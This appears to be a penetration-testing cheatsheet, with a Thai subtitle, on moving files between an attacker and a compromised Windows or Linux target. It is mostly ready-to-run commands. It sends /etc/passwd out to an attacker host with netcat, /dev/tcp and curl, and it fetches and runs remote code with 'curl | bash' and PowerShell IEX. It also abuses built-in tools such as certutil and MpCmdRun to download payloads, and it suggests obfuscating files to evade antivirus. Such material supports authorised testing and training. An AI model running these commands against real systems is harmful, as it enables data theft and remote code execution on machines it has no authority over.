# File Transfer Cheatsheet

> **วิธีการโอนไฟล์ระหว่าง Attacker และ Target สำหรับทุกสถานการณ์**

---

## Table of Contents

- [Quick Check](#quick-check)
- [Attacker → Target](#attacker--target-download-to-target)
- [Target → Attacker](#target--attacker-exfiltration)
- [Windows Methods](#windows-methods)
- [Linux Methods](#linux-methods)
- [Living off the Land](#living-off-the-land-lolbins)
- [Encoded Transfer](#encoded-transfer)
- [SMB/WebDAV Methods](#smbwebdav-methods)
- [Troubleshooting](#troubleshooting)

---

## Quick Check

```shell
# Attacker: Serve files
python3 -m http.server 80

# Linux target: Download
wget http://$lhost/file.sh -O /tmp/file.sh
curl http://$lhost/file.sh -o /tmp/file.sh

# Windows target: Download
certutil -urlcache -f http://$lhost/file.exe file.exe
powershell -c "iwr http://$lhost/file.exe -o file.exe"
```

---

## Attacker → Target (Download to Target)

### Serve Files (Attacker Side)

```shell
# Python HTTP server (most common)
python3 -m http.server 80
python2 -m SimpleHTTPServer 80

# PHP server
php -S 0.0.0.0:80

# Ruby server
ruby -run -ehttpd . -p80

# Busybox
busybox httpd -f -p 80

# Nginx (with upload)
# Edit /etc/nginx/sites-enabled/default
```

### SMB Server (Windows targets)

```shell
# Basic SMB share
impacket-smbserver share . -smb2support

# With authentication (bypass some restrictions)
impacket-smbserver share . -smb2support -user test -password test

# Windows download from SMB
copy \\$lhost\share\file.exe C:\Temp\file.exe
```

---

## Target → Attacker (Exfiltration)

### Receive Files (Attacker Side)

```shell
# Netcat listener
nc -lvnp 4444 > received_file

# Python upload server
python3 -c "
import http.server, cgi
class Handler(http.server.CGIHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        with open('uploaded_file', 'wb') as f:
            f.write(data)
        self.send_response(200)
        self.end_headers()
http.server.HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
"
```

### Send Files from Linux Target

```shell
# Netcat
nc $lhost 4444 < /etc/passwd

# Bash /dev/tcp
cat /etc/passwd > /dev/tcp/$lhost/4444

# Curl POST
curl -X POST -F "file=@/etc/passwd" http://$lhost/upload

# SCP (if SSH available)
scp /path/to/file user@$lhost:/tmp/
```

### Send Files from Windows Target

```powershell
# PowerShell upload
$bytes = [System.IO.File]::ReadAllBytes("C:\file.txt")
Invoke-WebRequest -Uri "http://$lhost/upload" -Method POST -Body $bytes
```

---

## Windows Methods

### Certutil (CMD)

```cmd
:: Most reliable Windows method
certutil -urlcache -f http://$lhost/file.exe file.exe

:: Decode base64 file
certutil -decode encoded.txt decoded.exe
```

### PowerShell

```powershell
# Invoke-WebRequest (iwr)
Invoke-WebRequest -Uri http://$lhost/file.exe -OutFile file.exe
iwr http://$lhost/file.exe -o file.exe

# WebClient
(New-Object Net.WebClient).DownloadFile('http://$lhost/file.exe','file.exe')

# Short form
powershell -c "iwr http://$lhost/file.exe -o file.exe"

# Bypass execution policy
powershell -ep bypass -c "iwr http://$lhost/file.exe -o file.exe"

# Download and execute in memory (fileless)
IEX(New-Object Net.WebClient).DownloadString('http://$lhost/script.ps1')
iex(iwr http://$lhost/script.ps1 -UseBasicParsing)
```

### BITSAdmin

```cmd
:: Background Intelligent Transfer
bitsadmin /transfer job /download /priority high http://$lhost/file.exe C:\Temp\file.exe
```

### Curl (Windows 10+)

```cmd
curl http://$lhost/file.exe -o file.exe
```

### SMB Copy

```cmd
:: Copy from attacker SMB share
copy \\$lhost\share\file.exe C:\Temp\file.exe
xcopy \\$lhost\share\file.exe C:\Temp\

:: Map drive
net use Z: \\$lhost\share
copy Z:\file.exe C:\Temp\

:: With credentials
net use Z: \\$lhost\share /user:test test
```

### FTP

```cmd
:: Create FTP script
echo open $lhost > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo get file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

---

## Linux Methods

### Wget

```shell
# Basic download
wget http://$lhost/file.sh

# Output to specific location
wget http://$lhost/file.sh -O /tmp/file.sh

# Quiet mode
wget -q http://$lhost/file.sh -O /tmp/file.sh

# Continue partial download
wget -c http://$lhost/largefile.tar
```

### Curl

```shell
# Download to file
curl http://$lhost/file.sh -o /tmp/file.sh

# Download and execute
curl http://$lhost/file.sh | bash

# Follow redirects
curl -L http://$lhost/file.sh -o file.sh

# With authentication
curl -u user:pass http://$lhost/file.sh -o file.sh
```

### Netcat

```shell
# Attacker (send file)
nc -lvnp 4444 < file.sh

# Target (receive file)
nc $lhost 4444 > file.sh

# With timeout
nc -w 3 $lhost 4444 > file.sh
```

### Bash /dev/tcp

```shell
# When no tools available
cat < /dev/tcp/$lhost/80 > file.sh
```

### Python

```shell
python3 -c "import urllib.request; urllib.request.urlretrieve('http://$lhost/file.sh', '/tmp/file.sh')"
python2 -c "import urllib; urllib.urlretrieve('http://$lhost/file.sh', '/tmp/file.sh')"
```

### Perl

```shell
perl -e 'use LWP::Simple; getstore("http://$lhost/file.sh", "/tmp/file.sh");'
```

### PHP

```shell
php -r 'file_put_contents("/tmp/file.sh", file_get_contents("http://$lhost/file.sh"));'
```

### Ruby

```shell
ruby -e 'require "net/http"; File.write("/tmp/file.sh", Net::HTTP.get(URI("http://$lhost/file.sh")))'
```

### SCP

```shell
# Copy from attacker
scp user@$lhost:/path/to/file.sh /tmp/file.sh

# Copy to attacker
scp /etc/passwd user@$lhost:/tmp/
```

### SFTP

```shell
sftp user@$lhost
get file.sh
put /etc/passwd
```

---

## Living off the Land (LOLBins)

### Windows LOLBins

```powershell
# MpCmdRun (Defender)
MpCmdRun.exe -DownloadFile -url http://$lhost/file.exe -path C:\Temp\file.exe

# Desktopimgdownldr (deprecated but works on older systems)
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://$lhost/file.exe /eventName:desktopimgdownldr

# Esentutl
esentutl.exe /y \\$lhost\share\file.exe /d file.exe /o

# Expand
expand \\$lhost\share\file.cab C:\Temp\file.exe
```

### Linux Alternatives

```shell
# Busybox wget
busybox wget http://$lhost/file.sh

# Lynx
lynx -source http://$lhost/file.sh > file.sh

# Fetch (BSD)
fetch http://$lhost/file.sh
```

---

## Encoded Transfer

### Base64 (No network required)

**Attacker (encode):**

```shell
base64 -w 0 file.exe > file.b64
cat file.b64  # Copy output
```

**Linux Target (decode):**

```shell
echo "BASE64_STRING_HERE" | base64 -d > file.exe
```

**Windows Target (decode):**

```powershell
# PowerShell
[System.Convert]::FromBase64String("BASE64_STRING") | Set-Content -Path file.exe -Encoding Byte

# Or save to file and decode
certutil -decode file.b64 file.exe
```

### Hex Encoding

**Attacker (encode):**

```shell
xxd -p file.exe | tr -d '\n' > file.hex
```

**Linux Target (decode):**

```shell
cat file.hex | xxd -r -p > file.exe
```

---

## SMB/WebDAV Methods

### SMB Server (Attacker)

```shell
# Basic share
impacket-smbserver share $(pwd) -smb2support

# With auth
impacket-smbserver share $(pwd) -smb2support -username test -password test
```

### WebDAV Server (Attacker)

```shell
# Install
pip install wsgidav

# Run server
wsgidav --host=0.0.0.0 --port=80 --root=/tmp/share --auth=anonymous
```

### Windows Access WebDAV

```cmd
:: Copy from WebDAV
copy \\$lhost\DavWWWRoot\file.exe C:\Temp\file.exe

:: Or use UNC path
dir \\$lhost@80\share\
```

---

## Troubleshooting

### Common Issues

| Issue | Solution |
|-------|----------|
| Firewall blocking | Use port 80 or 443 |
| AV blocking file | Encode/obfuscate or use SMB |
| No wget/curl | Use bash /dev/tcp or python |
| PowerShell restricted | Use certutil or bitsadmin |
| File corrupted | Use binary mode, check encoding |
| Slow transfer | Compress with gzip/zip first |

### Check Outbound Connectivity

```shell
# Linux
curl -I http://$lhost || wget --spider http://$lhost

# Windows
powershell -c "Test-NetConnection $lhost -Port 80"
```

### Verify File Integrity

```shell
# Attacker - generate hash
md5sum file.exe

# Linux Target - verify
md5sum file.exe

# Windows Target - verify
certutil -hashfile file.exe MD5
```

---

## 🔗 See Also

- [Reverse Shell](../6.OS-Command/6.3.Reverse-Shell.md)
- [Linux Commands](../6.OS-Command/6.2.Linux-command.md)
- [Windows Commands](../6.OS-Command/6.1.Windows-command.md)
- [Pivoting & Tunneling](../5.Lateral-Movement/5.2.Pivoting-Tunneling.md)
